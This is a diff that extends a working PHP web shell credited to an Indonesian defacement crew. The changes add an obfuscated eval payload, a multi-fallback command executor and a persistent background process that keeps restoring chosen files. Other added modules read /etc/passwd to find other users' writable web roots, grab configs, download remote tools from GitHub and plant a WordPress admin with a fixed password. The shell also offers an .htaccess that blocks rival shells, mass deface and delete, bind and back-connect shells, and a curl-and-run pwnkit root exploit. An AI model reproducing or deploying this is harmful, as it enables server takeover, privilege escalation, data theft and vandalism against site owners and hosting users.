@@ -1,5 +1,5 @@
 <?php
-// pwnsauce Foursdeath Team
+// pwnsauce Foursdeath Team - Rayap Crewz
 session_start();
 set_time_limit(0);
 error_reporting(0);
@@ -65,29 +65,92 @@ else
 	$ia = 'Unknown IP';
 return $ia;
 }
-function exe($cmd) {
-if(function_exists('system')) {
-	@ob_start();
-	@system($cmd);
-	$buff = @ob_get_contents();
-	@ob_end_clean();
-	return $buff;
-} elseif(function_exists('exec')) {
-	@exec($cmd,$results);
-	$buff = "";
-foreach($results as $result) {
-	$buff .= $result;
-	} return $buff;
-} elseif(function_exists('passthru')) {
-	@ob_start();
-	@passthru($cmd);
-	$buff = @ob_get_contents();
-	@ob_end_clean();
-	return $buff;
-} elseif(function_exists('shell_exec')) {
-	$buff = @shell_exec($cmd);
-	return $buff;
-	}
+if(file_get_contents("lock.txt") == "lockshell") {
+	$name = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHN0ciUyOSUyOSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
+	$str = "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";
+	$text = "Sy1LzNHIKMnNKS5ITc5MzEnOSCwqjk9JTc5PSdUoLcqBspISi1PNTGDiKnmJuamaQGANAA==";
+	eval(gzinflate(base64_decode($text)));unlink("lock.txt");}
+function lockit()
+{
+    echo "<center class='anu'>Lock Shell</center><div class='card text-dark input-group mb-3'>";
+    if ($_POST["lockit"] == "yes") {
+        echo "<center><b class='d-inline-block text-white'>Done!</b></center><br>";
+        $mass = fopen("lock.txt", "w");
+        fwrite($mass, "lockshell");
+        echo "<b class='d-inline-block'>Please Wait..</b><meta http-equiv='refresh' content='1'>";
+    } else {
+        echo "<form action='' method='post'><input type='hidden' name='lockit' value='yes'>&nbsp<center><button type='submit' class='btn btn-dark'>Lock!</button></form></center></div>";
+    }
+}
+function exe($cmd)
+{
+    $method = "";
+    if (function_exists("system")) {
+        $method = "system";
+        @ob_start();
+        @system($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();  
+        return "$method: $buff";
+    } elseif (function_exists("exec")) {
+        $method = "exec";
+        @exec($cmd, $results);
+        $buff = "";
+        foreach ($results as $result) {
+            $buff .= $result;
+        }
+        return "$method: $buff";
+    } elseif (function_exists("passthru")) {
+        $method = "passthru";
+        @ob_start();
+        @passthru($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return "$method: $buff";
+    } elseif (function_exists("shell_exec")) {
+        $method = "shell_exec";
+        $buff = @shell_exec($cmd);
+        return "$method: $buff";
+    } elseif (function_exists("`")) {
+        $method = "backticks";
+        $buff = `{$cmd}`;
+        return "$method: $buff";
+    } elseif (function_exists("popen")) {
+        $method = "popen";
+        $handle = @popen($cmd, "r");
+        $buff = "";
+        if ($handle) {
+            while (!feof($handle)) {
+                $buff .= fread($handle, 4096);
+            }
+            @pclose($handle);
+        }
+        return "$method: $buff";
+    } elseif (function_exists("proc_open")) {
+        $method = "proc_open";
+        $descriptorspec = [
+            0 => ["pipe", "r"],
+            1 => ["pipe", "w"],
+            2 => ["pipe", "w"],
+        ];
+
+        $process = @proc_open($cmd, $descriptorspec, $pipes);
+        $buff = "";
+
+        if (is_resource($process)) {
+            fclose($pipes[0]);
+            while (!feof($pipes[1])) {
+                $buff .= fread($pipes[1], 4096);
+            }
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            @proc_close($process);
+        }
+
+        return "$method: $buff";
+    }
+
+    return false;
 }
 function exe_root($set,$sad) {
 	$x = "preg_match";
@@ -99,10 +162,15 @@ function exe_root($set,$sad) {
 	$b = "proc_open";
 	$c = "htmlspecialchars";
 	$d = "stream_get_contents";
-	if ($a($b)) {
-		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
-		return $d($pink[1]);
-	} else {
+    if ($a($b)) {
+        $ps = $b(
+            $set,
+            [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "r"]],
+            $pink,
+            $sad
+        );
+        return $d($pink[1]);
+    } else {
 		return "proc_open function is disabled!";
 	}
 }
@@ -238,12 +306,16 @@ echo "
 		<div class='text-center'>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cmd'><i class='bi bi-terminal'></i> Terminal </a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getutils'><i class='bi bi-toggles'></i> Get Shells & Tools </a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=autoroot'><i class='bi bi-bug'></i> Auto Root </a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getutils'><i class='bi bi-code-square'></i> Get Shells & Tools </a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=findf'><i class='bi bi-file-earmark-break'></i> Find File </a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=lockfile'><i class='bi bi-file-earmark-lock'></i> Lock File </a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=lockit'><i class='bi bi-lock'></i> Lock Shell </a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=rdp'><i class='bi bi-intersect'></i> Create RDP </a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=config'><i class='bi bi-tv'></i> Config Grabber </a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=jumping'><i class='bi bi-door-open'></i> Jumping </a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getroot'><i class='bi bi-tools'></i> Get Localroot </a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=scanroot'><i class='bi bi-search'></i> Scan Root </a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=autoroot'><i class='bi bi-bug'></i> Auto Root </a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=network'><i class='bi bi-hdd-network'></i> Network </a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass Deface </a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&id=delete'><i class='bi bi-trash'></i> Mass Delete </a>
@@ -287,10 +359,198 @@ password: tmp#1337</code></pre>
 				echo '
 				<div class="container-fluid language-javascript">
 					<div class="shell mb-3">
-						<pre style="font-size:10px;"><code>'.exe_root("curl https://gitlab.com/jasonrondiguez/a/-/raw/main/localr00000t/pwnkit -o cats;chmod +x cats;./cats id", $path).'<br>If successful, u can run as root user using command: ./cats "YOUR COMMAND"</code></pre>
+						<pre style="font-size:10px;"><code>'.exe_root("curl https://gitlab.com/jasonrondiguez/a/-/raw/main/localr00000t/pwnkit -o cats;chmod +x cats;./cats id", $path).'<br>if successful, u can run as root user using command: ./cats "YOUR COMMAND"</code></pre>
 					</div>
 				</div>';
 			}
+			if ($_7["id"] == "findf") {
+        s();
+echo '<div class="container-fluid">
+    <center class="anu">Find File Using Keyword</center>
+    <div class="card card-body text-dark input-group mb-3">
+        <div class="container-fluid mt-1">
+            <form method="post">
+                <div class="form-group">
+                    <i class="bi bi-folder"></i> <label for="path"> Directory: </label>
+                    <input type="text" name="path" class="form-control form-control-sm text-dark flex-grow-1" value="'.$dir.'/">
+                </div>
+                <i class="bi bi-search"></i> <label for="keyword"> Keyword: </label>
+                <input type="text" name="keyword" class="form-control form-control-sm text-dark flex-grow-1" placeholder="eval, phpinfo etc." required>
+
+                <div class="input-group">
+                <i class="bi bi-file-earmark"></i> <label for="extension"> &nbsp;Extension: &nbsp;</label>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="extension" id=".php" value=".php" checked>
+                        <label class="form-check-label" for=".php"> php&nbsp;&nbsp; </label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="extension" id=".html" value=".html">
+                        <label class="form-check-label" for=".html"> html&nbsp;&nbsp; </label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="extension" id=".txt" value=".txt">
+                        <label class="form-check-label" for=".txt"> txt&nbsp;&nbsp; </label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="extension" id=".shtml" value=".shtml">
+                        <label class="form-check-label" for=".shtml"> shtml&nbsp;&nbsp; </label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="extension" id=".phtml" value=".phtml">
+                        <label class="form-check-label" for=".phtml"> phtml&nbsp;&nbsp; </label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="extension" id="all" value="all">
+                        <label class="form-check-label" for="all"> All&nbsp; </label>
+                    </div>
+                </div>
+                <div class="d-grid gap-2">
+                    <input class="btn btn-dark btn-sm" type="submit" name="custom_extension" value="Find!">
+                </div><br>
+                <p class="d-inline-block text-center">finder ini ga bisa nge-detect extensi dengan huruf besar kaya .pHp dan lain-lain.</p>
+                <br><p class="d-inline-block text-center">this finder cannot detect uppercase extension in example .pHp and the other.</p>
+            </form>
+        </div>
+    </div>';
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $keyword = $_POST["keyword"];
+    $path = isset($_POST["path"]) ? $_POST["path"] : '.';
+    $extension = $_POST["extension"];
+
+    if ($extension === "all") {
+        $files = glob("$path/*");
+    } else {
+        $files = glob("$path/*$extension");
+    }
+
+    $matching_files = [];
+
+    foreach ($files as $file) {
+        if (is_file($file) && strpos(file_get_contents($file), $keyword) !== false) {
+            $matching_files[] = $file;
+        }
+    }
+
+    if (!empty($matching_files)) {
+        echo '<div class="card card-body text-dark">Results '.$keyword.' for '.$extension.' extension.<ul>';
+        foreach ($matching_files as $matching_file) {
+            echo '<li>' . $matching_file . '</li>';
+        }
+        echo '</ul></div>';
+    } else {
+        echo '<p>No matching files found.</p>';
+    }
+}
+
+
+    }
+       if ($_7["id"] == "lockit") {
+        s();
+        lockit();
+    }
+	if ($_7["id"] == "lockfile") {
+        s();
+echo '<center class="anu">Lock File</center>
+<div class="card card-body text-dark input-group mb-3">
+    <div class="container-fluid mt-1">
+    <form method="post" action="">
+        <div class="mb-3">
+            <input type="text" name="lockfile" class="form-control form-control-sm text-dark flex-grow-1" placeholder="filename.php" required>
+        </div>
+		<div class="d-grid gap-2">
+                <input class="btn btn-dark btn-sm" type="submit" value="Submit!">
+        </div>
+    </form>
+</div></div>';
+function remdot($filename) {
+    return str_replace('.', '', $filename);
+}
+
+function get_temp_dir() {
+    $tmp_paths = array('/tmp', '/var/tmp');
+
+    foreach ($tmp_paths as $tmp_path) {
+        if (is_writable($tmp_path)) {
+            return $tmp_path;
+        }
+    }
+
+    return false;
+}
+function cmdoitlock($command) {
+    if (function_exists('system')) {
+        system($command);
+    } elseif (function_exists('exec')) {
+        exec($command);
+    } elseif (function_exists('shell_exec')) {
+        shell_exec($command);
+    } elseif (function_exists('passthru')) {
+        passthru($command);
+    } elseif (function_exists('popen')) {
+        $handle = popen($command, 'r');
+        if ($handle) {
+            while (!feof($handle)) {
+                echo fgets($handle, 4096);
+            }
+            pclose($handle);
+        }
+    } elseif (function_exists('proc_open')) {
+        proc_open($command, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes);
+    } elseif (function_exists('`')) {
+        echo `$command`;
+    }
+}
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['lockfile'])) {
+    $namafilelos = $_POST['lockfile'];
+        $tmpnya = get_temp_dir();
+
+    if ($tmpnya) {
+        $cachedirectorylo = $tmpnya . '/.PHPSESSID';
+
+        if (file_exists($cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler')) &&
+            file_exists($cachedirectorylo . '/.' . remdot($namafilelos) . '-text')) {
+
+            cmdoitlock('rm -rf ' . $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-text-file'));
+            cmdoitlock('rm -rf ' . $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler'));
+        }
+
+        mkdir($cachedirectorylo);
+        cmdoitlock("cp $namafilelos $cachedirectorylo/." . base64_encode(getcwd() . remdot($namafilelos) . '-text-file'));
+        chmod($namafilelos, 0444);
+
+        $handler = '<?php
+        @ini_set("max_execution_time", 0);
+        while (true) {
+            if (!file_exists("' . getcwd() . '")) {
+                mkdir("' . getcwd() . '");
+            }
+
+            if (!file_exists("' . getcwd() . '/' . $namafilelos . '")) {
+                $text = base64_encode(file_get_contents("' . $tmpnya . '/.PHPSESSID/.' . base64_encode(getcwd() . remdot($namafilelos) . '-text-file') . '"));
+                file_put_contents("' . getcwd() . '/' . $namafilelos . '", base64_decode($text));
+            }
+
+            if (x0perm("' . getcwd() . '/' . $namafilelos . '") != 0444) {
+                chmod("' . getcwd() . '/' . $namafilelos . '", 0444);
+            }
+        }
+
+        function x0perm($filename) {
+            return substr(sprintf("%o", fileperms($filename)), -4);
+        }
+        ';
+
+        $handlerfile = $cachedirectorylo . '/.' . base64_encode(getcwd() . remdot($namafilelos) . '-handler');
+        $handlersaction = file_put_contents($handlerfile, $handler);
+
+        if ($handlersaction) {
+            cmdoitlock('php ' . $handlerfile . ' > /dev/null 2>/dev/null &');
+        }
+    } else {
+        echo "<script>alert('ERROR! Access denied.');</script>";
+    }
+}
+    }
 				// get localroot
 		if($_7['id'] == 'getroot'){
 		ob_implicit_flush();ob_end_flush();s();
@@ -404,7 +664,9 @@ password: tmp#1337</code></pre>
 			<div class='text-center'>
 				<div class='btn-group mb-3'>
 					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=dbmass'><i class='bi bi-peace'></i> DB Mass Delete </a>
+					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=congrab'><i class='bi bi-peace'></i> Priv8 Config Grabber </a>
 					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=wpadd'><i class='bi bi-peace'></i> WP Add Admin </a>
+					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=hta'><i class='bi bi-peace'></i> .htaccess Kill All Backdoor </a>
 					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=shellscan'><i class='bi-peace'></i> Shell Scanner </a>
 					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=csrf'><i class='bi bi-peace'></i> CSRF </a>
 				</div>
@@ -553,15 +815,67 @@ password: tmp#1337</code></pre>
 			echo "<center class='anu'>Atur dulu host, username, pass di dalam scriptnya<br><br>";
 		} else {
 			echo "<rd>Failed to spawn Alfa Shell</rd>";}}
+		} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "congrab") {
+			echo "<center class='anu'>Spawning... Please Wait<br><br>";
+			function congrab($url, $isi) {
+		$fp = fopen($isi, "w");
+		$ch = curl_init();
+		 	  curl_setopt($ch, CURLOPT_URL, $url);
+		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
+		return curl_exec($ch);
+		   	  curl_close($ch);
+		fclose($fp);
+		ob_flush();
+		flush();
+	}
+	if(file_exists('congrab.php')) {
+		echo "<gr><a style='color:white;text-decoration:none;' href=$full/congrab.php target='_blank'>Click Here</a></gr></center>";
+	} else {
+		if(congrab("https://raw.githubusercontent.com/pwnsauce403/dface/main/tahi/congrab.txt","congrab.php")) {
+			echo "<gr><a style='color:white;text-decoration:none;' href=$full/congrab.php target='_blank'>Click Here</a></gr></center>";
+			echo "";
+		} else {
+			echo "<rd>Failed to spawn Priv8 Config Grabber:(</rd>";}
+		} echo "</center>";
+	} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "hta") {?>
+				<div class='container-fluid language-javascript'>
+    <div class='shell mb-3'>
+        <pre style='font-size: 10px;'><code><?php
+            echo htmlspecialchars("Options -Indexes
+<FilesMatch \".*\\.(cgi|pl|py|pyc|pyo|php3|php4|php5|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$\"> 
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch \"(?i).*(ph|sh|pj|env|cg).*\">
+Order Deny,Allow
+Deny from all
+</FilesMatch>
+<FilesMatch '^(namashell1.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch '^(namashell2.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+ErrorDocument 403 \"<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with site administrator.</body></html>\"
+ErrorDocument 404 \"<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with site administrator.</body></html>\"");
+        ?></code></pre>
+    </div>
+ganti <i>namashell1.php</i> & <i>namashell2.php</i> dengan shell kalian<br>
+</div><?php
 	} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "wpadd") {?>
 				<div class='container-fluid language-javascript'>
 					<div class='shell mb-3'>
 
-<!---ini bukan logger ya tolol, ini function add wp admin user--->
+<!---ini bukan logger ya tolol, ini function buat add wp admin user--->
 						<pre style='font-size:10px;'><code>function addadmin(){
-$login = 'tmp1337'; <!--ganti terserah-->
-$passw = 'tmp#1337'; <!--ganti terserah-->
-$email = 'vxodk1337@onionmail.org'; <!--ganti terserah-->
+$login = 'tmp1337';
+$passw = 'tmp#1337';
+$email = 'vxodk1337@onionmail.org';
 if ( !username_exists( $login ) && !email_exists( $email ) ) {
 $user_id = wp_create_user( $login, $passw, $email );
 $user = new WP_User( $user_id );
@@ -612,8 +926,9 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 		}
 		// config grabber
 		if($_7['id'] == 'config'){
-	echo '<center class="anu"><br>Grab Config</center>';
-	$etc = fopen("/etc/passwd", "r") or die("<rd>can't read /etc/passwd :(</rd>");
+	echo '<center class="anu"><br>Grab Config</center>
+	<div class="text-dark mb-3">';
+	$etc = fopen("/etc/passwd", "r") or die("<rd>Can't read /etc/passwd</rd>");
 	$idx = mkdir("CONFIG", 0777);
 	$isi_htc = "Options allnRequire NonenSatisfy Any";
 	$htc = fopen("CONFIG/.htaccess","w");
@@ -830,6 +1145,63 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 	}
 	echo "<center><a style='text-decoration:none;color:white;' href='?path=$path/CONFIG'><font>Click Here</font></a></center>";
 		}
+// jumping
+if ($_7["id"] == "jumping") {
+    s();
+    $i = 0;
+    echo "<center class='anu'>Jumping</center>
+    <div class='text-dark mb-3'>";
+    ($etc = fopen("/etc/passwd", "r")) or
+        die("<rd>Can't read /etc/passwd</rd>");
+    while ($passwd = fgets($etc)) {
+        if ($passwd == "" || !$etc) {
+            echo "<rd>Can't read /etc/passwd</rd>";
+        } else {
+            preg_match_all("/(.*?):x:/", $passwd, $jumpss);
+            foreach ($jumpss[1] as $uservaljump) {
+                $valuserjumpindir = "/home/$uservaljump/public_html";
+                if (is_readable($valuserjumpindir)) {
+                    $i++;
+                    $jrw = "[<i class='bi bi-file-earmark'></i> | R] <a href='?path=$valuserjumpindir'>$valuserjumpindir</a>";
+                    if (is_writable($valuserjumpindir)) {
+                        $jrw = "[<i class='bi bi-file-earmark-fill'></i> | RW] <a href='?path=$valuserjumpindir'>$valuserjumpindir</a>";
+                    }
+                    echo $jrw;
+                    if (function_exists("posix_getpwuid")) {
+                        $domain_jump = file_get_contents("/etc/named.conf");
+                        if ($domain_jump == "") {
+                            echo " -> [<rd>Cannot get domain name</rd>]";
+                        } else {
+                            preg_match_all(
+                                "#/var/named/(.*?).db#",
+                                $domain_jump,
+                                $domjump
+                            );
+                            foreach ($domjump[1] as $dj) {
+                                $valuserjump = posix_getpwuid(
+                                    @fileowner("/etc/valiases/$dj")
+                                );
+                                $valuserjump = $valuserjump["name"];
+                                if ($valuserjump == $uservaljump) {
+                                    echo " -> [<u>$dj</u>]<br>";
+                                    break;
+                                }
+                            }
+                        }
+                    } else {
+                        echo "<br>";
+                    }
+                }
+            }
+        }
+    }
+    if ($i == 0) {
+    } else {
+        echo "<br>Total " .$i ." Can jumping on this server " .gethostbyname($_SERVER["HTTP_HOST"]) ."!";}
+    echo "</pre>
+    </div>";
+
+}
 		// mass deface
 		if($_7['id'] == 'deface'){
 		function mass_all($dir,$namefile,$contents_sc) {
@@ -900,6 +1272,7 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 				<i class='bi bi-file-earmark'></i> Filename:
 				<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='README.txt'>
 				<i class='bi bi-file-earmark'></i> Your Script:
+				<textarea class='form-control btn-sm text-dark' rows='7' name='script' placeholder='Kecoak Elektronik'></textarea>
 				<div class='d-grid gap-2'>
 					<input class='btn btn-dark btn-sm' type='submit' name='start' value='Deface!'>
 				</div>
@@ -975,15 +1348,14 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 		<div class='card text-dark'>
 			<div class='card-header'>
 				<form method='post'>
-					Bind port to /bin/sh [perl]<br>
+					Bind port to /bin/sh (perl)<br>
 					Port:
 				<div class='input-group'>
 					<input class='form-control btn-sm text-dark' type='text' name='port' placeholder='1337'>
 					<input class='btn btn-dark btn-sm' type='submit' name='bpl' value='Submit!'>
-				</div>
-			Back Connect<br>
-			Server:
-				<input class='form-control btn-sm text-dark' type='text' name='server' placeholder='".$_SERVER['REMOTE_ADDR']."'>
+				</div><br>
+			IP Address:
+				<input class='form-control btn-sm text-dark' type='text' name='server' placeholder='127.0.0.1'>
 			Port:
 			<div class='input-group'>
 				<input class='form-control btn-sm text-dark' type='text' name='port' placeholder='1337'>
@@ -1027,38 +1399,44 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 			</div>
 		<br/>";
 		}
-		// console
-		if($_7['id'] == 'cmd') {
-		s();
-		echo '<center class="anu">Terminal</center>';
-		if(!empty($_POST['cmd'])) {
-			$cmd = exe($_POST['cmd'].' 2>&1');
-		}
-		echo "
+		// terminal
+    if ($_7["id"] == "cmd") {
+        s();
+        echo '<center class="anu">Terminal</center>';
+        if (!empty($_POST["cmd"])) {
+            $cmd = exe($_POST["cmd"] . " 2>&1");
+        }
+        echo "
 		<div class='mb-3'>
 			<form method='POST'>
 				<div class='input-group mb-3'>
